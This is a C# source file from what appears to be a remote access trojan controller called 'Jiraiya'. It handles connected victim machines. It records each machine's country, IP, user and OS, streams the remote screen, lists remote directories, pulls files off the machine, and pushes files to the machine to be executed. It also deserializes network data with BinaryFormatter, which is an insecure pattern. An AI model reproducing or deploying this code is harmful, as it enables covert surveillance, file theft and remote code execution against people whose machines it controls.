using Jiraiya.commands;
using Jiraiya.Forms;
using Jiraiya.Utils;
//using Jiraiya.Utils.Compression;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Windows.Forms;
using xClient.responds;
using System.Windows.Forms;

namespace Jiraiya.tcp
{
    public class Client
    {
        public Socket s;
        public userData data; // client information
        //client forms
        public frmScreen frmScreen;
        public frmControl frmControl;
        public List<frmDownload> downForms = new List<frmDownload>();
        public List<frmUploads> UpExForms = new List<frmUploads>();

        static IBcodec MyCodec = new IBcodec(); 
        IFormatter formatter = new BinaryFormatter();
        byte[] rec_buff = new byte[1024 * 1000];  //buffer used to receive payloeads
        int expected_payload_length;
        int collectd_data_length;
        byte[] raw_data; //buffer for the data meant to be sent
        byte[] rec_packet; //packet fully received
        const int packet_header_size = 4; // size of the payload header used to tell how much data we are supposed to receive
        private  Queue<byte[]> _rec_buff_Q = new Queue<byte[]>(); //queue for received payloads
        public List<tobe_file> rec_files = new List<tobe_file>();
        public static object rec_files_Lock = new object();


        byte[] received;

        public Client(Socket s)
        {
            this.s = s;
            data = new userData();
            s.BeginReceive(rec_buff, 0, rec_buff.Length, SocketFlags.None, rec_callback, null);
            
        }



        void handle_packet(byte[] rec)
        {
            rec = Jiraiya.Utils.Compression.SafeQuickLZ.Decompress(rec);
                 using (MemoryStream ms = new MemoryStream(rec))
                {

                    try
                    {
                        ms.Position = 0;
                        respond command = (respond)formatter.Deserialize(ms);
                        var type = command.GetType();

                        if (type == typeof(xClient.responds.SendInfo))
                        {
                            handle_SendInfo((xClient.responds.SendInfo)command);

                        }
                        if (type == typeof(xClient.responds.SendScreen))
                        {
                            hendle_SendScreen((xClient.responds.SendScreen)command);

                        }
                        if (type == typeof(xClient.responds.SendDirectory))
                        {
                            hendle_sendDirectory((xClient.responds.SendDirectory)command);

                        }
                        if (type == typeof(xClient.responds.SendFile))
                        {
                            handle_sendFile((xClient.responds.SendFile)command);

                        }
                        if (type == typeof(xClient.responds.UploadExec))
                        {
                            hendle_UploadExec((xClient.responds.UploadExec)command);

                        }


                    }
                    catch (System.Runtime.Serialization.SerializationException e)
                    {
                        Console.WriteLine("raw_data =" + rec.Length);
                    }
                    catch (Exception e) { Console.WriteLine(e.Message); }
                    finally
                    {
                        expected_payload_length = 0;
                        collectd_data_length = 0;
                        rec_packet = null;
                    }
                }
         
        }

        void rec_callback(IAsyncResult ar)
        {
            
            try
            {
               int k= s.EndReceive(ar);
                received = new byte[k];
                 
                Array.Copy(rec_buff, received, received.Length);
              
                            if (Encoding.ASCII.GetString(received) != "kanare007")
                            {
                                try
                                {
                                    if (collectd_data_length == 0) //  dealing with a new packet
                                    {
                                        expected_payload_length = BitConverter.ToInt32(received, 0);
                                        if (expected_payload_length > 0 && expected_payload_length < 1024 * 1024 * 5) {
                                        if (received.Length - packet_header_size == expected_payload_length)
                                        {
                                            raw_data = new byte[expected_payload_length];
                                            Array.Copy(received, packet_header_size, raw_data, 0, received.Length - packet_header_size);
                                            handle_packet(raw_data);

                                        }
                                        else // packet larger then receving buffer or didn't come in one payload
                                        { // put received data in queue untill we reach the expected length
                                            raw_data = new byte[rec_buff.Length - packet_header_size];
                                            Array.Copy(received, packet_header_size, raw_data, 0, received.Length - packet_header_size);
                                            collectd_data_length = raw_data.Length;
                                            _rec_buff_Q.Enqueue(raw_data);
                                        }
                                    }

                                    }
                                    else // queing data for current packet
                                    {
                                        if (expected_payload_length - collectd_data_length <= rec_buff.Length)
                                        {// this is last payload of the packet 
                                            raw_data = new byte[expected_payload_length - collectd_data_length];
                                            Array.Copy(received, 0, raw_data, 0, raw_data.Length);
                                            collectd_data_length += raw_data.Length;
                                            _rec_buff_Q.Enqueue(raw_data);
                                            if (expected_payload_length == collectd_data_length) { 
                                            Console.WriteLine("yey");
                                            rec_packet = new byte[expected_payload_length];
                                            int off = 0;
                                            while (_rec_buff_Q.Count > 0)
                                            {
                                                byte[] prt = _rec_buff_Q.Dequeue();
                                                Array.Copy(prt, 0, rec_packet, off, prt.Length);
                                                off += prt.Length;
                                            }
                                            if (k > raw_data.Length)
                                            {//server sent additional data 
                                                Console.WriteLine("additional data");
                                            }
                                            collectd_data_length = 0;
                                            handle_packet(rec_packet);
                                            
                                            }
                                        }
                                        else // still haven't reach the end yet
                                        {
                                            _rec_buff_Q.Enqueue(received);
                                            collectd_data_length += raw_data.Length;
                                        }
                                    }
                                }
                                catch (Exception ) {
                                    expected_payload_length = 0;
                                    collectd_data_length = 0;
                                    rec_packet = null;
                                };
                            }
                        
              s.BeginReceive(rec_buff, 0, rec_buff.Length, 0, rec_callback, null);
            }
            catch (SocketException e)
            {
                close();
                if (Disconnected != null)
                {
                    Disconnected(this);
                }
            }
        }









        private void handle_SendInfo(SendInfo obj)
        {
            if (Authenticated != null)
            {
                this.data.Country = obj.country;
                this.data.IP = obj.IP;
                this.data.UserAtPc = obj.pcuser;
                this.data.Tag = obj.tag;
                this.data.OperatingSystem = obj.os;
                this.data.image_index = obj.Image_index;
                Authenticated(this);
            }
        }
        private void hendle_SendScreen(SendScreen obj)
        {
          

            if (obj.image != null)
            {
                try {
                    Bitmap res = MyCodec.Decoder(obj.image, obj.rectangle, obj.bounds,obj.cursor);
                    if(frmScreen != null)
                    frmScreen.screenBox.Image = res; 

                    }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            System.GC.Collect();
            if (frmScreen != null && frmScreen.go)
            {
                Send(new GetScreen(frmScreen.quality, 1, 1));
            }
           

            

        }
        private void hendle_sendDirectory(SendDirectory obj)
        {
            frmControl.files_ListView.Invoke((MethodInvoker)delegate
            {
                frmControl.files_ListView.Clear();
                frmControl.files_ListView.Columns.AddRange(new ColumnHeader[] { new ColumnHeader(), new ColumnHeader(), new ColumnHeader() });
            });
                        
            if (this.frmControl != null)
            {
                ListViewItem lvi;
                aFile f;
                string[] det;
                for (int i = 0; i < obj.names.Count; i++)
                {
                    try { 
                    f= new aFile(obj.names[i],Utils.Helpers.getDirShortName(obj.names[i]),obj.types[i],Utils.Helpers.file_size(obj.sizes[i]));
                    det = Utils.Helpers.isFolder(f.fn) ? new string[] { " " + f.n } : new string[] { " " + f.n, f.t, f.s };
                    lvi = new ListViewItem(det) 
                 { Tag = f, ImageIndex = Utils.Helpers.getDirImage(obj.types[i]) };

                    frmControl.files_ListView.Invoke((MethodInvoker)delegate
                    {
                        frmControl.files_ListView.Items.Add(lvi);
                    });
                }
                    catch (Exception e) { Console.WriteLine(e.Message); }
                    }
            
                frmControl.fmLoadPic.Invoke((MethodInvoker)delegate
                {
                    frmControl.fmLoadPic.Image= frmControl.small_icons.Images[0];
                });
                
            }
        }
        private void hendle_UploadExec(UploadExec obj)
        {
            int ind2;
            //if the file fully sent
            if (obj.file[0] == '-')
            {
                ind2 = Utils.Helpers.UPWindowIndex(UpExForms, obj.file.Substring(1));
                if (ind2 > -1 && UpExForms[ind2] != null)
                {
                    UpExForms[ind2].Invoke((MethodInvoker)delegate
                    {
                        int cp = tcp.Server.fileManager.get_chunk_num(obj.file);
                        UpExForms[ind2].ProgressBar.Value = 100;
                        UpExForms[ind2].label_downloaded.Text = "(100%)";
                        UpExForms[ind2].pause_download.Text = "Execute";
                        UpExForms[ind2].finished = true;
                    });
                }

                return;
            }
            if (!File.Exists(tcp.Server.fileManager.clean_path(obj.file))) return;
            FileInfo f = new FileInfo(tcp.Server.fileManager.clean_path(obj.file));
            tcp.Server.fileManager.start(obj.file);
            
            ind2 = Utils.Helpers.UPWindowIndex(UpExForms, tcp.Server.fileManager.clean_path(obj.file));
            
            
             
            if (ind2 > -1 && UpExForms[ind2] != null)
            {
                UpExForms[ind2].Invoke((MethodInvoker)delegate
                {
                    int cp = tcp.Server.fileManager.get_chunk_num(obj.file);
                    UpExForms[ind2].current_part = cp;
                    //before sending check if i didn't canceled or paused uploading
                    if (!UpExForms[ind2].paused)
                    Send(new DownExec(tcp.Server.fileManager.clean_path(obj.file),
                                                      tcp.Server.fileManager.tobe_sent,
                                                      tcp.Server.fileManager.get_chunk_num(obj.file),
                                                      tcp.Server.fileManager.calc_num_chunks((int)f.Length),
                                                      (int)f.Length,
                                                      false,
                                                      UpExForms[ind2].dis
                                                      ));
                    //update progress bar
                    
                    UpExForms[ind2].update_rate_and_progress(cp, tcp.Server.fileManager.calc_num_chunks((int)f.Length));
                    
                });
            }
           

        }
        private void handle_sendFile(SendFile obj)
        {
            int ind = Utils.Helpers.fileInList(rec_files, obj.name);
            //check if the file is already in our list
            if (ind !=-1 )
            {
               
                rec_files[ind].queue.Enqueue(obj.file_part);
                rec_files[ind].rec += obj.file_part.Length;

                //update progress bar
                int ind2 = Utils.Helpers.downWindowIndex(downForms, obj.name);
                if (ind2 > -1 && downForms[ind2] != null)
                {
                    downForms[ind2].Invoke((MethodInvoker)delegate
                    {
                        downForms[ind2].update_rate_and_progress(obj.file_part.Length, obj.current_part, obj.parts, rec_files[ind].rec, rec_files[ind].size);
                        downForms[ind2].current_part = obj.current_part;
                    });
                }

            }
            else 
            {
                //check if this part isn't a lost part (doesnt exist in list but doesn't start with the first part)
                if(obj.current_part==0)
                lock (rec_files_Lock)
                { 
                rec_files.Add(new tobe_file(obj.name, obj.file_part ,obj.size , obj.file_part.Length ));
                }
                
            }
          

            ind = Utils.Helpers.fileInList(rec_files, obj.name);
            if (obj.current_part < obj.parts - 1)
            { //file not fully received
                if (ind != -1 &&
                    rec_files[Utils.Helpers.fileInList(rec_files, obj.name)].paused == false)
                Send(new GetFile((obj.current_part + 1) + obj.name));
            }
            else
            {//file received
                lock (rec_files_Lock) { 
                Utils.Helpers.buildFile(rec_files, obj.name);
                int ind2 = Utils.Helpers.downWindowIndex(downForms, obj.name);
                if (ind2 > -1 && downForms[ind2]!=null)
                {
                    downForms[ind2].Invoke((MethodInvoker)delegate {
                        downForms[ind2].finished = true;
                        downForms[ind2].ProgressBar.Value = 100;
                        downForms[ind2].label_downloaded.Text = "(100%)";
                        downForms[ind2].firefoxH23.Hide();
                        downForms[ind2].label_rate.Hide();
                        downForms[ind2].pause_download.Text = "Open";

                    });                      
                }
                }
            }
        }
        public void close()
        {
            s.Close();
        }


        public delegate void DisconnectiontHandler(Client s );
        public event DisconnectiontHandler Disconnected;

        public delegate void clientAuthenticated(Client s);
        public event clientAuthenticated Authenticated;









        public void Send<T>(T packet) where T : commands.command
        {
            if (packet == null) return;
            using (MemoryStream ms = new MemoryStream())
            {
                try
                {
                    IFormatter formatter = new BinaryFormatter();
                    formatter.Serialize(ms, packet);
                }
                catch (Exception)
                {
                    return;
                }

                byte[] payload = ms.ToArray();
                s.Send(payload);
            }

        }



        public void handle_disconnect()
        {
            rec_buff = null;
            raw_data = null;
            s.Close();
            s = null;
        }
    }


   }
